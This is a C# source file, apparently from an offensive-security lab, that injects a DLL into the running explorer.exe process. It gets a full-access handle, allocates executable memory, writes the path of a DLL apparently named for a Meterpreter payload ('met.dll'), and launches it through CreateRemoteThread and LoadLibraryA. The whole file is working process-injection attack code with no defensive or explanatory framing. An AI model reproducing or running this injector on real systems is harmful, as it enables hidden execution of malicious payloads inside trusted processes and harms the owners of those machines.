using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace DLL_Injection
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        static int Main(string[] args)
        {
            String dllname = "C:\\Users\\test\\source\\repos\\Dll Injection\\DLL Injection\\met.dll";

            int pid = Process.GetProcessesByName("explorer")[0].Id;
            IntPtr rProccess = OpenProcess(0x001F0FFF, false, pid);
            Console.WriteLine("[+] explorer.exe pid: " + pid);
            IntPtr addr = VirtualAllocEx(rProccess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Fail to alloc memory: ");
                return -1;
            }
            else
            {
                Console.WriteLine("[+] Dll Name located at : 0x" + String.Format("{0:X}",(addr).ToInt64()));
            }

            IntPtr outSize;
            bool wpm = WriteProcessMemory(rProccess, addr, Encoding.Default.GetBytes(dllname), dllname.Length, out outSize);
            if (!wpm)
            {
                Console.WriteLine("[-] Fail to write data at : 0x"+ String.Format("{0:X}", (addr).ToInt64()));
                return -1;
            }
            else
            {
                Console.WriteLine("[+] Data wrote at : 0x" + String.Format("{0:X}", (addr).ToInt64()));
            }
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (loadLib == IntPtr.Zero)
            {
                Console.WriteLine("[-] Fail to Find LoadLibraryA address");
                return -1;
            }
            else
            {
                Console.WriteLine("[+] LoadLibraryA address : 0x" + String.Format("{0:X}", (loadLib).ToInt64()));
            }
            IntPtr hThread = CreateRemoteThread(rProccess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Fail to create remote thread");
                return -1;
            }
            else
            {
                Console.WriteLine("[+] Thread created with handle: 0x" + String.Format("{0:X}", (hThread).ToInt64()));
            }
            return 0;
            
        }
    }
}
